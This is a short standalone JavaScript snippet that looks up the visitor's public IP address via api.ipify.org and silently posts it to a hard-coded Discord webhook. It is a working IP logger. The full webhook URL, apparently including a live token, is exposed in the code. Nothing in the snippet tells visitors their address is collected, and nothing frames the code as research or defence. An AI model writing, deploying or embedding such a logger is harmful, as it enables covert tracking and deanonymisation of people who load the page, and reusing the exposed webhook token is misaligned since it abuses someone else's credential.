var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function(response) {
    return response.json();
})
.then(function(data) {
    ip = data.ip;
    var webhook = 'https://discord.com/api/webhooks/1140271497072611380/5WD1Zn7OQmAE2F1ykbpylm6_VDXn0nQRv_yp6kyPGe4F8aPz4BOeTb47nL6kuhe1-u1g'
    var message = {
        content: 'IP:' + ip 
    };

    fetch(webhook,{
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    });
});